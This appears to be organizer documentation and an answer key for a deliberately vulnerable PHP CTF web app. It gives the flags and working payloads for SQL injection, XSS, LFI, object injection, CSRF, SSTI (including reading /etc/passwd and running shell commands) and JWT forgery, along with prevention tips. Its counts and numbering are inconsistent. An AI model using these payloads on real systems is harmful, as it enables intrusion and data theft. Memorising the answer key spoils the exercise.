# CyberTech Solutions CTF - Challenge Documentation

## Overview
This is a deliberately vulnerable web application for CTF competitions. It contains multiple security vulnerabilities across different categories.

**All 11 challenges have been tested and verified working as of February 2026.**

---

## Challenges Summary

| # | Challenge | Type | Difficulty | Flag |
|---|-----------|------|------------|------|
| 1 | SQL Injection | Web | Easy | `CCEE{sql_1nj3ct10n_m4st3r}` |
| 2 | XSS (Reflected) | Web | Easy | `CCEE{xss_r3fl3ct3d_4tt4ck}` |
| 3 | XSS (Stored) | Web | Easy | `CCEE{st0r3d_xss_1n_c0nt4ct}` |
| 4 | IDOR | Web | Easy | `CCEE{1d0r_vuln3r4b1l1ty_f0und}` |
| 5 | Local File Inclusion | Web | Medium | `CCEE{c0nf1g_f1l3s_4r3_tr34sur3s}` |
| 6 | PHP Object Injection | Web | Medium | `CCEE{c00k13_m0nst3r_4dm1n}` |
| 7 | Logic Flaw | Web | Medium | `CCEE{l0g1c_fl4w_sh0pp1ng_spr33}` |
| 8 | Info Disclosure | OSINT | Easy | `CCEE{b4ckup_f1l3s_l34k_s3cr3ts}` |
| 9 | HTTP Headers | OSINT | Easy | `CCEE{h34d3r5_t3ll_s3cr3ts}` |
| 10 | CSRF | Web | Medium | `CCEE{csrf_n0_t0k3n_n0_pr0t3ct10n}` |
| 11 | SSTI | Web | Hard | `CCEE{sst1_t3mpl4t3_1nj3ct10n_pwn3d}` |
| 12 | JWT Vulnerabilities | Web | Hard | `CCEE{jwt_4lg0r1thm_c0nfus10n_4tt4ck}` |

---

## Detailed Challenge Writeups

### 1. SQL Injection (Easy) ✅ VERIFIED
**Location:** `login_legacy.php`  
**Vulnerability:** Unsanitized user input in SQL query  
**Payload:** `' OR '1'='1` or `admin' -- `  
**Flag:** `CCEE{sql_1nj3ct10n_m4st3r}`

### 2. Reflected XSS (Easy) ✅ VERIFIED
**Location:** `about.php?member=`  
**Vulnerability:** User input reflected without sanitization  
**Payload:** `<script>alert('XSS')</script>` or `<img src=x onerror=alert(1)>`  
**Attack:** Navigate to `about.php?member=<script>alert('XSS')</script>`  
**Flag:** `CCEE{xss_r3fl3ct3d_4tt4ck}` (appears after XSS payload renders)

### 3. Stored XSS (Easy) ✅ VERIFIED
**Location:** `contact.php` (Public Feedback section)  
**Vulnerability:** Message content stored and displayed without sanitization  
**Payload:** `<script>alert('XSS')</script>` or `<img src=x onerror=alert(1)>`  
**Attack:**
1. Go to Contact page
2. Submit a message with XSS payload in the message field
3. The payload executes when viewing Public Feedback section
4. Flag appears when XSS is detected

**Flag:** `CCEE{st0r3d_xss_1n_c0nt4ct}`

### 4. IDOR - Insecure Direct Object Reference (Easy) ✅ VERIFIED
**Location:** `view_message.php?id=1`  
**Vulnerability:** No authorization check on message IDs  
**Attack:** Navigate to `view_message.php?id=1` to view admin's private message  
**Flag:** `CCEE{1d0r_vuln3r4b1l1ty_f0und}`

### 4. Local File Inclusion (Medium) ✅ VERIFIED
**Location:** `admin.php?file=`  
**Vulnerability:** Arbitrary file inclusion via `include()`  
**Payload:** `?file=php://filter/read=convert.base64-encode/resource=includes/config.php`  
**Flag:** `CCEE{c0nf1g_f1l3s_4r3_tr34sur3s}` (in config.php comments, decode base64 to see)

### 5. PHP Object Injection (Medium) ✅ VERIFIED
**Location:** `login.php` cookie `session_token`  
**Vulnerability:** Unsafe `unserialize()` on user-controlled cookie  
**Attack:** Craft serialized `UserSession` object with `role=admin`  
**Payload Cookie:** `O:11:"UserSession":3:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";s:7:"isValid";b:1;}` (base64 encoded)  
**Flag:** `CCEE{c00k13_m0nst3r_4dm1n}`

### 6. Logic Flaw (Medium) ✅ VERIFIED
**Location:** `shop.php`  
**Vulnerability:** No validation on quantity field (accepts negative values)  
**Attack:** Enter negative quantity (e.g., `-100`) to gain credits instead of spending them. Repeat until you have $1,000,000 to buy the flag.  
**Flag:** `CCEE{l0g1c_fl4w_sh0pp1ng_spr33}`

### 7. Information Disclosure (Easy) ✅ VERIFIED
**Location:** `config.php.bak`, `robots.txt`  
**Vulnerability:** Backup configuration file publicly accessible  
**Attack:** Navigate to `http://target/challenge/config.php.bak`  
**Flag:** `CCEE{b4ckup_f1l3s_l34k_s3cr3ts}`

### 8. HTTP Headers (Easy) ✅ VERIFIED
**Location:** `dashboard.php` response headers  
**Vulnerability:** Flag exposed in custom HTTP header `X-Custom-Flag`  
**Attack:** Use `curl -I http://target/challenge/dashboard.php` or browser DevTools Network tab  
**Flag:** `CCEE{h34d3r5_t3ll_s3cr3ts}`

---

## NEW CHALLENGES

### 9. Cross-Site Request Forgery - CSRF (Medium) ✅ VERIFIED
**Location:** `profile.php`  
**Vulnerability:** No CSRF tokens protecting sensitive operations

**Vulnerable Operations:**
1. Password change
2. Email update  
3. Credit transfer

**Attack Scenario:**
1. Attacker creates a malicious HTML page
2. Victim (logged into CyberTech) visits the page
3. Hidden forms auto-submit to change victim's password/transfer credits

**Example Exploit (host this on attacker server):**
```html
<html>
<body>
<form action="http://target/profile.php" method="POST" id="csrf">
    <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

**Flag:** `CCEE{csrf_n0_t0k3n_n0_pr0t3ct10n}`

**Prevention:**
- Implement CSRF tokens
- Use SameSite cookie attribute
- Validate Origin/Referer headers

---

### 10. Server-Side Template Injection - SSTI (Hard) ✅ VERIFIED
**Location:** `newsletter.php`  
**Vulnerability:** Custom template engine uses `eval()` on user input

**Template Syntax:**
- `{{variable}}` - Standard variable substitution
- `${expression}` - **VULNERABLE** - Executes as PHP code
- `{{= expression }}` - **VULNERABLE** - Also executes as PHP

**Attack Steps:**
1. Go to Newsletter page with `?mode=preview` parameter
2. In template editor, enter: `${7*7}`
3. Preview shows `49` - confirming code execution
4. Read flag: `${file_get_contents('includes/ssti_flag.txt')}`

**Advanced Payloads:**
```
${phpinfo()}
${file_get_contents('/etc/passwd')}
${shell_exec('whoami')}
${system('cat includes/ssti_flag.txt')}
```

**Flag:** `CCEE{sst1_t3mpl4t3_1nj3ct10n_pwn3d}`

**Prevention:**
- Never use `eval()` on user input
- Use established template engines with sandboxing
- Implement strict input validation

---

### 11. JWT Vulnerabilities (Hard) ✅ VERIFIED
**Location:** `api/auth.php`, `jwt_demo.php`  
**Vulnerabilities:**
1. Algorithm confusion (accepts "none")
2. Weak secret key: `supersecretkey123`
3. No token expiration

**Attack Method 1: Algorithm Confusion**
1. Login as `guest:guest` to get a JWT
2. Decode the token (Base64)
3. Modify header: `{"typ":"JWT","alg":"none"}`
4. Modify payload: `{"role":"admin",...}`
5. Remove signature but keep trailing dot
6. Use forged token to access admin profile

**Forged Token:**
```
Header:  {"typ":"JWT","alg":"none"}
Payload: {"user_id":1,"username":"admin","role":"admin","iat":1234567890}

Base64 Token:
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxMjM0NTY3ODkwfQ.
```

**Attack Method 2: Brute Force Secret**
```bash
# With hashcat or john
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
# Secret: supersecretkey123
```

**Testing:**
```bash
# Get token
curl -X POST http://target/api/auth.php?action=login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}'

# Test forged token
curl http://target/api/auth.php?action=profile \
  -H "Authorization: Bearer <forged_token>"
```

**Flag:** `CCEE{jwt_4lg0r1thm_c0nfus10n_4tt4ck}`

**Prevention:**
- Never accept "none" algorithm
- Use strong, randomly-generated secrets
- Always validate token expiration
- Use established JWT libraries

---

## Files Structure

```
challenge/
├── index.php              # Homepage
├── about.php              # XSS vulnerability
├── services.php           # Services page
├── shop.php               # Logic flaw vulnerability
├── contact.php            # Contact form
├── careers.php            # File upload (optional)
├── login.php              # PHP Object Injection
├── login_legacy.php       # SQL Injection
├── logout.php             # Logout handler
├── dashboard.php          # XSS + Header flag
├── admin.php              # LFI vulnerability
├── view_message.php       # IDOR vulnerability
├── profile.php            # CSRF vulnerability (NEW)
├── newsletter.php         # SSTI vulnerability (NEW)
├── jwt_demo.php           # JWT testing interface (NEW)
├── robots.txt             # Info disclosure hints
├── config.php.bak         # Backup file with creds
├── api/
│   ├── auth.php           # JWT vulnerabilities (NEW)
│   ├── search.php         # Search API
│   └── scoreboard.php     # CTF scoreboard
├── includes/
│   ├── config.php         # Database config + flag
│   ├── header.php         # Site header
│   ├── footer.php         # Site footer
│   └── ssti_flag.txt      # SSTI challenge flag (NEW)
├── exploits/
│   └── csrf_exploit.html  # Example CSRF exploit (NEW)
└── css/
    └── style.css          # Site styles
```

---

## Setup Instructions

1. Build and run with Docker:
   ```bash
   docker-compose up --build
   ```

2. Access at `http://localhost:8080`

3. Default credentials:
   - Admin: `admin` / `admin123`
   - User: `john` / `password123`
   - Guest: `guest` / `guest`

---

## Scoring Suggestions

| Challenge | Points |
|-----------|--------|
| Info Disclosure | 50 |
| HTTP Headers | 50 |
| XSS (Reflected) | 100 |
| SQL Injection | 100 |
| IDOR | 100 |
| CSRF | 150 |
| Logic Flaw | 150 |
| LFI | 200 |
| PHP Object Injection | 200 |
| SSTI | 250 |
| JWT Vulnerabilities | 250 |

**Total: 1600 points**

---

## Notes for Organizers

- All flags follow the format: `CCEE{...}`
- Difficulty ratings are subjective and may vary based on participants' experience
- Consider providing hints for harder challenges
- Monitor logs for solution attempts
- The CSRF exploit page needs to be hosted separately or opened as a local file
